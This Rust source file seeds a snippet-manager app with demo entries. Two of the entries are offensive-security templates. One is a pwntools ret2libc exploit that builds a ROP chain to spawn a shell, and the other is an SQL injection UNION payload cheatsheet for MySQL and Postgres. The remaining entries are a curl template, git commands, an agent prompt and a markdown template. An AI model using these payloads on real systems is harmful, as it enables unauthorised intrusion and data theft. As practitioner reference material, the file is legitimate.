use crate::models::{SnippetInput, SnippetType};
use crate::repo::Repo;
use rusqlite::Connection;

/// Insert demo snippets into a brand-new database so the app is usable on
/// first launch. Only called when the database was just created.
pub fn seed(conn: &Connection) -> rusqlite::Result<()> {
    let repo = Repo::new(conn);
    for input in seed_snippets() {
        repo.insert(&input)?;
    }
    Ok(())
}

fn snip(
    title: &str,
    content: &str,
    r#type: SnippetType,
    category: &str,
    language: &str,
    tags: &[&str],
    aliases: &[&str],
) -> SnippetInput {
    SnippetInput {
        title: title.into(),
        content: content.into(),
        r#type,
        category: category.into(),
        language: language.into(),
        tags: tags.iter().map(|t| t.to_string()).collect(),
        aliases: aliases.iter().map(|a| a.to_string()).collect(),
    }
}

fn seed_snippets() -> Vec<SnippetInput> {
    vec![
        snip(
            "ret2libc EXP Template (pwntools)",
            "from pwn import *\n\ncontext.binary = './binary'\ncontext.log_level = 'debug'\n\nelf = ELF('./binary')\nlibc = ELF('./libc.so.6')\nrop = ROP(elf)\n\npop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]\n\n# TODO: leak a libc address, then:\n# system = libc.symbols['system']\n# binsh  = next(libc.search(b'/bin/sh'))\n\npayload = b'A' * OFFSET + p64(pop_rdi) + p64(binsh) + p64(system)\n\nio = process('./binary')\nio.sendline(payload)\nio.interactive()",
            SnippetType::Exp,
            "Security/Pwn",
            "python",
            &["pwn", "pwntools", "ret2libc"],
            &["rtl", "ret2libc"],
        ),
        snip(
            "SQLi UNION Payload Cheatsheet",
            "-- determine column count\n' ORDER BY 1--\n' ORDER BY 2--\n\n-- union select with NULLs (MySQL)\n' UNION SELECT NULL,NULL,NULL--\n\n-- dump version / user (adjust column count)\n' UNION SELECT NULL,version(),NULL--\n' UNION SELECT NULL,user(),NULL--\n\n-- Postgres\n' UNION SELECT NULL,NULL,NULL--\n' UNION SELECT NULL,version(),NULL--",
            SnippetType::Payload,
            "Security/Web",
            "sql",
            &["sqli", "payload", "union", "web"],
            &["sqli", "union"],
        ),
        snip(
            "curl API Request Template",
            "curl -X POST \"https://api.example.com/v1/items\" \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"name\": \"demo\", \"count\": 3}'",
            SnippetType::Command,
            "Dev/HTTP",
            "bash",
            &["curl", "http", "api"],
            &["curl"],
        ),
        snip(
            "Git Undo Cheatsheet",
            "# undo last commit, keep changes staged\ngit reset --soft HEAD~1\n\n# undo last commit, keep changes unstaged\ngit reset --mixed HEAD~1\n\n# discard all local changes (careful!)\ngit reset --hard HEAD\n\n# amend last commit message\ngit commit --amend -m \"new message\"\n\n# restore one file from HEAD\ngit checkout HEAD -- path/to/file\n\n# undo a pushed commit (shared history)\ngit revert <commit>",
            SnippetType::Command,
            "Dev/Git",
            "bash",
            &["git", "undo", "reset"],
            &["gundo"],
        ),
        snip(
            "Code Agent Prompt: Root-Cause Bug Fix Loop",
            "You are debugging a bug in this repository.\n\nProblem:\n{{description}}\n\nRules:\n1. Reproduce or read the failing test first.\n2. Locate the ROOT CAUSE before editing anything.\n3. Make the smallest change that fixes it.\n4. Run the relevant tests and report exact output.\n\nReport: root cause -> fix -> verification.",
            SnippetType::Prompt,
            "AI/Codex",
            "markdown",
            &["prompt", "codex", "harness", "debug"],
            &["fix"],
        ),
        snip(
            "Markdown Report Template",
            "# Title\n\n## Summary\n\n<!-- one paragraph -->\n\n## Details\n\n| Item | Value |\n| ---- | ----- |\n|      |       |\n\n## Conclusion\n\n- [ ] follow-up item",
            SnippetType::Template,
            "Writing",
            "markdown",
            &["markdown", "report", "template"],
            &["md"],
        ),
    ]
}
